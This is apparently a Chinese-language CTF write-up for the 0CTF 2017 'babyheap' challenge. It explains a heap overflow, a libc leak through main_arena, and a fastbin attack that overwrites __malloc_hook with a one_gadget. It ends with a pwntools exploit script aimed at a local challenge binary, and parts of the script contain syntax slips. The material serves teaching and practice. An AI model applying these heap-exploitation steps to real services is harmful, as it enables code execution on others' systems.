题目四个功能 alloc fill free dump

![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/1.png)

（fast chunk 没有标志位 没有bk 不会合并）

题目分析

	考察点：fastbin attack

	漏洞：chunk的填充范围可大于chunk的大小，覆盖到下面的chunk

	求出libc_base，修改malloc_hook内容为shellcode，执行malloc()，等于执行getshell

第一步 求出libc_base

	两种方法

	第一种  伪造一个大chunk a覆盖下一个大于0x80的chunk b，free掉下一个chunk b，然后show伪造的chunk a，得到chunk b的fd，fd指向main_arena

    alloc(0x60)
    alloc(0x40)
    fill(0, 0x60+0x10, 'a'*0x60 + p64(0) + p64(0x71))

	新建两个块，用chunk0覆盖掉chunk1的头
![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/2.png)
	
    alloc(0x100)
    fill(2, 0x20, 'c'*0x10+p64(0)+p64(0x71))
    free(1)
    alloc(0x60)
    fill(1, 0x40+0x10,'a'*0x40+p64(0)+p64(0x111))
    alloc(0x50)
    free(2)
    dump(1)

	新建一个0x100的chunk2，填充chunk2，伪造一个chunk头，距离跟chunk1刚好适合修改了的chunk1的大小，这时我们把chunk1 free掉再申请，那么chunk1真的变成0x60大了，而且还刚好覆盖掉chunk2的fd和bk的位置。

	利用chunk1修复chunk2的头，再申请一个chunk3，以防chunk2被合并，把chunk2 free掉，再把chunk1 dump出来，main_arena就出来了

![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/3.png)
![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/4.png)



求偏移：0x7f5d2bec3b78 - 0x 7f5d2bb28000 = 0x39bb78

(靶机偏移是0x3a5678   与我机差值0x9b00)

	第二种  不同指针指向同一chunk，一个free，另一个show，便得到main_arena地址

    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x80)
    free(1)
    free(2)
    payload = p64(0)*3+p64(0x21) + p64(0)*3+p64(0x21) + p8(0x80)
    #借用chunk0修改chunk2的fd指向chunk4
    fill(0, payload)
    payload = p64(0)*3+p64(0x21) + p64(0x21)
    #借用chunk3修改chunk4的头
    fill(3, payload)
    alloc(0x10)
    alloc(0x10)
    #这时指针 2 和 4 同时指向chunk4
    payload = p64(0)*3+p64(0x21) + p64(0x91)
    #借用chunk3恢复chunk4的头
    fill(3, payload)
    alloc(0x80)
    free(4)
    dump(2)
    #指针2就把chunk4的内容dump出来了

第二步 修改malloc_hook内容

	free掉两个chunk，然后修改chunk的fd为malloc_hook的地址，但系统会检测fd指向chunk的头size是否适合，所以我们找找malloc_hook地址前的数据，发现把地址偏移一下，便可构造出size为0x7f的chunk头，所以fd的内容应为malloc_hook地址加偏移量

 ![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/5.png)

malloc_hook偏移为0x3a5610

 ![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/6.png)

可见，malloc_hook上方存在0x7f，可以伪造头，只要把地址偏移一下就可以通过检查建立一个0x60的chunk，然后填充数据修改malloc内容。  偏移为 0x10+0x8+0x3+0x8。
 ![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/7.png)


shellcode依然由one_gadget取得
 ![image](https://github.com/lhc328/pwn/blob/master/picture/20170ctfbabyheap/8.png)


执行alloc，就会getshell。

exp：

    from pwn import *
    import sys
    
    def alloc(size):
      r.recvuntil("Command: ")
      r.sendline("1")
      r.recvuntil("Size: ")
      r.sendline(str(size))
     
    def fill(idx, length, content):
      r.recvuntil("Command: ")
      r.sendline("2")
      r.recvuntil("Index: ")
      r.sendline(str(idx)
      r.recvuntil("Size: ")
      r.sendline(str(length))
      r.recvuntil("Content: ")
      r.send(content)
          
    def free(idx):
      r.recvuntil("Command: ")
      r.sendline("3")           
      r.recvuntil("Index: ")
      r.sendline(str(idx))
                 
    def dump(idx):
      r.recvuntil("Command: ")
      r.sendline("4")           
      r.recvuntil("Index: ")
      r.sendline(str(idx))  
      r.recvuntil("Content: \n")
      return r.recvline()[:-1]
                 
    def exploit(r):
       alloc(0x60)
       alloc(0x40)
       fill(0, 0x60+0x10, 'a'*0x60 + p64(0) + p64(0x71))
       alloc(0x100)
       fill(2, 0x20, 'c'*0x10+p64(0)+p64(0x71))
       free(1)
       alloc(0x60)
       fill(1, 0x40+0x10,'a'*0x40+p64(0)+p64(0x111))
       alloc(0x50)
       free(2)
       libcbase = u64(dump(1)[-8:]) - 0x3a5678
       
       malloc_hook = libcbase + 0x3a5610
       execve_addr = libcbase + 0x41374
       free(1)          
       payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0)
       fill(0, 0x60+0x10+0x10, payload)
       alloc(0x60)
       alloc(0x60)         
       payload = p8(0*3) + p64(0)*2 + p64(execve_addr)
       fill(2, len(payload), payload)
       alloc(0x20)
                 
    r = process("./babyheap")
    #r = remote()
    #print util.proc.pidof(r)
    pause()
    exploit(r)             


